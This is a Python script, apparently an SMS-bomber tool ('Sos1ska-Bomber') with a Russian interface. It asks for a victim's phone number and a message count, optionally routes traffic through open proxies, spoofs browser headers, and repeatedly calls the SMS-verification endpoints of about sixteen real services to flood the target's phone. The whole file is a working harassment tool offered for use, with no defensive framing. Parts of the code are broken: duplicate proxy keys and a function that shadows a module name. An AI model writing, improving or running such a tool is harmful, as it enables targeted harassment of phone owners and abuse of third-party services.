#!/usr/bin/python3
import requests
import os
from colorama import Fore, Style
import time
import random
import datetime

def bans():
	print('''
░██████╗░█████╗░░██████╗░░███╗░░░██████╗██╗░░██╗░█████╗░░░░░░░██╗░░██╗░█████╗░░█████╗░██╗░░██╗███████╗██████╗░░██████╗
██╔════╝██╔══██╗██╔════╝░████║░░██╔════╝██║░██╔╝██╔══██╗░░░░░░██║░░██║██╔══██╗██╔══██╗██║░██╔╝██╔════╝██╔══██╗██╔════╝
╚█████╗░██║░░██║╚█████╗░██╔██║░░╚█████╗░█████═╝░███████║█████╗███████║███████║██║░░╚═╝█████═╝░█████╗░░██████╔╝╚█████╗░
░╚═══██╗██║░░██║░╚═══██╗╚═╝██║░░░╚═══██╗██╔═██╗░██╔══██║╚════╝██╔══██║██╔══██║██║░░██╗██╔═██╗░██╔══╝░░██╔══██╗░╚═══██╗
██████╔╝╚█████╔╝██████╔╝███████╗██████╔╝██║░╚██╗██║░░██║░░░░░░██║░░██║██║░░██║╚█████╔╝██║░╚██╗███████╗██║░░██║██████╔╝
╚═════╝░░╚════╝░╚═════╝░╚══════╝╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝░░░░░░╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝╚═════╝░
	''')
print()
print(f'\t\t\t\tWellcome')
time.sleep(5)
os.system("clear")
bans()
print(Fore.RED + '[Sos1ska-Bomber 2.2 RU - Unix Edition]' + Style.RESET_ALL)
print()
print('Код написан им', Fore.GREEN + '--->' + Style.RESET_ALL, Fore.BLUE + 'https://vk.com/nikitasos1ska' + Style.RESET_ALL)
print()
print()
print('Наши ВК ссылки', Fore.GREEN + '--->' + Style.RESET_ALL, Fore.BLUE + f'https://vk.com/nikitasos1ska\n'
f'\t\t    https://vk.com/2pac_jdm\n'
f'\t\t    https://vk.com/paket\n'
f'\t\t    https://vk.com/covidone\n' + Style.RESET_ALL)
print('Наши GitHub ссылки', Fore.GREEN + '--->' + Style.RESET_ALL, Fore.BLUE + f'https://github.com/Sos1ska\n'
f'\t\t\thttps://github.com/Cool-Haackers\n'
f'\t\t\thttps://github.com/Ki11sesh\n' + Style.RESET_ALL)
print('Наша почта', Fore.GREEN + '--->' + Style.RESET_ALL, Fore.BLUE + f'soshack00@gmail.com' + Style.RESET_ALL)
print()

# Установка номера телефона, а также кол-во смс
print(Fore.YELLOW + 'Введите номер телефона. Пример:' + Style.RESET_ALL, Fore.CYAN + '+79021100147' + Style.RESET_ALL)
input_number = input(Fore.GREEN + ">> " + Style.RESET_ALL)
print(Fore.YELLOW + 'Кол-во смс?' + Style.RESET_ALL)
sms = int(input(Fore.GREEN + ">> " + Style.RESET_ALL))

# Предложение от СМС-атаки через Tor
print(f"Хотите ли вы использовать  Tor Y/N? ")
is_tor = input(Fore.GREEN + ">> " + Style.RESET_ALL)

# Проверка номера

def parse_number(number):
	msg = f"[*]Проверка номера - Номер правильный!"
	if len(number) in (10, 11, 12):
		if number[0] == "8":
			number = number[1:]
			print(msg)
		elif number[:2] == "+7":
			number = number[2:]
			print(msg)
		elif int(len(number)) == 10 and number[0] == 9:
			print(msg)
	else:
		print(f"[*]Проверка номера - Номер введён не правильно, проверьте номер телефона")
		time.sleep(5)
		quit()
	return number
number = parse_number(input_number)

# Tor
if str(is_tor) == "y":
	def get_tor_session():
		session = requests.session()
		session.proxies = {'http': 'http://5.252.161.48:8080',
						'http': 'http://5.252.161.48:3128',
						'http': 'http://5.252.161.48:8080',
						'http': 'http://161.35.70.249:3128',
						'http': 'http://18.132.249.194:80'}
		return session

	session = get_tor_session()
	print(session.get("http://httpbin.org/ip").text)

heads = [
    {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:76.0) Gecko/20100101 Firefox/76.0',
        'Accept': '*/*'
    },
    {
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
    {
    "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
    {
    'User-Agent': 'Mozilla/5.0 (Windows NT 3.1; rv:76.0) Gecko/20100101 Firefox/69.0',
    'Accept': '*/*'
    },
    {
    "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/76.0",
    'Accept': '*/*'
    },
]
           
           
def check(sent, sms):
    if sent == sms:
        quit()
 

def time(sent):
    a = datetime.datetime.now()
    time = (str(a.hour) + ':' + str(a.minute) + ':' +str(a.second))
    msg1 = f"SMS отправлено!"
    msg2 = f"{str(time)}"
    if int(sent) < 10:
    	print(f"{msg1}         {msg2}")
    elif int(sent) < 100:
    	print(f"{msg1}        {msg2}")
    elif int(sent) < 1000:
    	print(f"{msg1}       {msg2}")
    elif int(sent) < 10000:
    	print(f"{msg1}      {msg2}")
    else:
        print(f"{msg1}     {msg2}")
    	

def attack(number, sms):
    number_7 = str(7) + number
    number_plus7 = str(+7) + number
    number_8 = str(8) + number
    sent = 0
    print("-" * 33)
    print(f"|    Кол-во    |      Время      |")
    print("-" * 33)
    HEADERS = random.choice(heads)
    while sent <= sms:
    	try:
    		requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': number_7}, headers=HEADERS)
    		sent += 1
    		time(sent)
    		check(sent,sms)
    	except:
    		pass
    		
    	try:
    		requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json = {"phone": number_7}, headers=HEADERS)
    		sent += 1
    		time(sent)
    		check(sent,sms)
    	except:
    		pass
    		
    	try:
    		requests.post('https://cloud.mail.ru/api/v2/notify/applink',json = {"phone": number_plus7, "api": 2, "email": "email","x-email": "x-email"}, headers=HEADERS)
    		sent += 1
    		time(sent)
    		check(sent,sms)
    	except:
    		pass
    		
    	try:
    		requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': number_plus7}, headers=HEADERS)
    		sent += 1
    		time(sent)
    		check(sent,sms)
    	except:
    		pass
    		
    	try:
    		requests.post('https://b.utair.ru/api/v1/login/', data = {'login':number_8}, headers=HEADERS)
    		sent += 1
    		time(sent)
    		check(sent,sms)
    	except:
    		pass
    		
    	try:
    		requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data = {"phone_number":number_7}, headers=HEADERS)
    		sent += 1
    		time(sent)
    		check(sent,sms)
    	except:
    		pass
    		
    	try:
    		requests.post('https://www.citilink.ru/registration/confirm/phone/+'+ number_7 +'/', headers=HEADERS)
    		sent += 1
    		time(sent)
    		check(sent,sms)
    	except:
    		pass
    		
    	try:
    		requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone", data = {"st.r.phone": number_plus7}, headers=HEADERS)
    		sent += 1
    		time(sent)
    		check(sent,sms)
    	except:
    		pass
    		
    	try:
    	    requests.post('https://app.karusel.ru/api/v1/phone/', data = {"phone":number_7}, headers=HEADERS)
    	    sent += 1
    	    time(sent)
    	    check(sent,sms)
    	except:
    		pass
    		
    	try:
    		requests.post('https://youdrive.today/login/web/phone', data = {'phone': number, 'phone_code': '7'},headers=HEADERS) #headers = {}, headers=HEADERS)
    		sent += 1
    		time(sent)
    		check(sent,sms)
    	except:
    		pass
    		
    	try:
    		requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': number_7}, headers=HEADERS)
    		sent += 1
    		time(sent)
    		check(sent,sms)
    	except:
    		pass
    		
    	try:
    		requests.post('https://youla.ru/web-api/auth/request_code', json = {"phone":number_plus7}, headers=HEADERS)
    		sent += 1
    		time(sent)
    		check(sent,sms)
    	except:
    		pass
    		
    	try:
    		requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + number_7}, headers=HEADERS)
    		sent += 1
    		time(sent)
    		check(sent,sms)
    	except:
    		pass
    		
    	try:
    		requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data= {"phone": number_7}, headers=HEADERS)
    		sent += 1
    		time(sent)
    		check(sent,sms)
    	except:
    		pass
    		
    	try:
    		requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": number_7, "SignupForm[device_type]": 3}, headers=HEADERS)
    		sent += 1
    		time(sent)
    		check(sent,sms)
    	except:
    		pass
    		
    	try:
    	    requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': number_7, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"}, headers=HEADERS)
    	    sent += 1
    	    time(sent)
    	    check(sent,sms)
    	except:
    		pass

attack(number, sms)